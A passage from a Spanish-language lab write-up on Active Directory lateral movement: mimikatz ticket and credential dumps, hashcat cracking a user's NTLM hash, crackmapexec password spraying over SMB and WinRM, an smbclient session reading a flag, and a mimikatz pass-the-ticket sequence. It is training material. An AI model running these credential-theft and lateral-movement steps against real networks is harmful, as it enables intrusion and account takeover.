           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (--) : @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             d70fdbcfb3e38d09e1fc7d9b343dd021028158a2ee8baab87b4413a5000847c5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 7/8/2025 10:59:17 PM ; 7/9/2025 8:59:17 AM ; 7/15/2025 10:59:17 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM ( corp.com )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             3e42aaaedafca603b7df189a335a229bb774e5da797a9129cc150961c700ed1d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 33787 (00000000:000083fb)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-96-0-1

         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 33749 (00000000:000083d5)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-96-0-0

         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CLIENT76$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:00 PM
SID               : S-1-5-18

         * Username : client76$
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:00:21 PM ; 7/9/2025 8:59:14 AM ; 7/15/2025 10:59:14 PM
           Service Name (02) : cifs ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM ( corp.com )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             c28d1a8db4146cb66bc44f1ff9ed115452edc876c293db5d83deb1012dc04794
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
         [00000001]
           Start/End/MaxRenew: 7/8/2025 11:00:21 PM ; 7/9/2025 8:59:14 AM ; 7/15/2025 10:59:14 PM
           Service Name (01) : CLIENT76$ ; @ CORP.COM
           Target Name  (01) : CLIENT76$ ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             2a92ad4cf1c377e42f9ecb4a27ec4d3f34a9d971dc9fd236a680182e46a85d3a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
         [00000002]
           Start/End/MaxRenew: 7/8/2025 10:59:20 PM ; 7/9/2025 8:59:14 AM ; 7/15/2025 10:59:14 PM
           Service Name (02) : LDAP ; DC1.corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             23a6b6f4ee59c38dec4e6a9bc8293bb530d72cc2f76470430e7ccb9948a8275c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
         [00000003]
           Start/End/MaxRenew: 7/8/2025 10:59:14 PM ; 7/9/2025 8:59:14 AM ; 7/15/2025 10:59:14 PM
           Service Name (02) : ldap ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : ldap ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             090ee55393bea833c4424d3c5526ff737b7df07dfd49c797750d027587c349de
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:00:21 PM ; 7/9/2025 8:59:14 AM ; 7/15/2025 10:59:14 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (--) : @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             4b1a6d7094b9bf9dc47f851c852b596fc8bf3b58765f75132e47636d01b8e257
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 7/8/2025 10:59:14 PM ; 7/9/2025 8:59:14 AM ; 7/15/2025 10:59:14 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             e735aaf80207d6fa964152e6b5a3dee9a4a5a7192257681a128a06ba5b63eb07
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```

* Crackeamos el hash de dave:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# hashcat -m 1000 -a 0 "08d7a47a6f9f66b97b1bae4178747494" /usr/share/wordlists/rockyou.txt -o cracked_hash.txt

┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# cat cracked_hash.txt 
08d7a47a6f9f66b97b1bae4178747494:Flowers1
```

* Propagamos las credenciales:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# crackmapexec smb 192.168.142.70-76 -u dave -p "Flowers1" --continue-on-success
SMB         192.168.142.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.142.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.142.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.142.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.142.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.142.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.142.70  445    DC1              [+] corp.com\dave:Flowers1 
SMB         192.168.142.74  445    CLIENT74         [+] corp.com\dave:Flowers1 (Pwn3d!)
SMB         192.168.142.73  445    FILES04          [+] corp.com\dave:Flowers1 
SMB         192.168.142.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
SMB         192.168.142.76  445    CLIENT76         [+] corp.com\dave:Flowers1 
SMB         192.168.142.72  445    WEB04            [+] corp.com\dave:Flowers1

┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# crackmapexec winrm 192.168.142.70-76 -u dave -p "Flowers1" --continue-on-success
SMB         192.168.142.74  5985   CLIENT74         [*] Windows 11 Build 22000 (name:CLIENT74) (domain:corp.com)
SMB         192.168.142.73  5985   FILES04          [*] Windows Server 2022 Build 20348 (name:FILES04) (domain:corp.com)
SMB         192.168.142.72  5985   WEB04            [*] Windows Server 2022 Build 20348 (name:WEB04) (domain:corp.com)
HTTP        192.168.142.72  5985   WEB04            [*] http://192.168.142.72:5985/wsman
SMB         192.168.142.75  5985   CLIENT75         [*] Windows 11 Build 22000 (name:CLIENT75) (domain:corp.com)
HTTP        192.168.142.74  5985   CLIENT74         [*] http://192.168.142.74:5985/wsman
HTTP        192.168.142.75  5985   CLIENT75         [*] http://192.168.142.75:5985/wsman
SMB         192.168.142.70  5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:corp.com)
HTTP        192.168.142.73  5985   FILES04          [*] http://192.168.142.73:5985/wsman
HTTP        192.168.142.70  5985   DC1              [*] http://192.168.142.70:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.142.72  5985   WEB04            [-] corp.com\dave:Flowers1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.                                                                             
  arc4 = algorithms.ARC4(self._key)                                                                                                                
WINRM       192.168.142.74  5985   CLIENT74         [+] corp.com\dave:Flowers1 (Pwn3d!)                                                            
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.                                                                             
  arc4 = algorithms.ARC4(self._key)                                                                                                                
WINRM       192.168.142.75  5985   CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)                                                            
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.                                                                             
  arc4 = algorithms.ARC4(self._key)                                                                                                                
WINRM       192.168.142.73  5985   FILES04          [-] corp.com\dave:Flowers1                                                                     
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.                                                                             
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.142.70  5985   DC1              [-] corp.com\dave:Flowers1

```

#### Obtenemos el flag en WEB04:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# impacket-smbclient dave:"Flowers1"@192.168.132.72 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
# use backup
# ls
drw-rw-rw-          0  Wed Jul  9 10:07:51 2025 .
drw-rw-rw-          0  Wed Jul  9 10:07:51 2025 ..
-rw-rw-rw-          0  Wed Sep 14 07:01:20 2022 backup_schemata.txt
-rw-rw-rw-         78  Wed Jul  9 10:07:51 2025 proof.txt
# cat proof.txt
OS{c0755bca3caa4fb3c5c94e530e0f3b15}
# 
```

## Troubleshooting
### Spooler start:

```powershell
Set-Service -Name spooler -StartupType Automatic

Start-Service -Name spooler
```

> En caso de no contar con la contrasena de dave pudimos haber ejecutado un **PTT**

```powershell
1- mimikatz # sekurlsa::tickets /export

2- [0;17e3fb]-0-0-40810000-dave@cifs-WEB04.corp.com.kirbi

3- mimikatz # kerberos::ptt [0;17e3fb]-0-0-40810000-dave@cifs-WEB04.corp.com.kirbi

4- mimikatz # kerberos::list

5-  
```
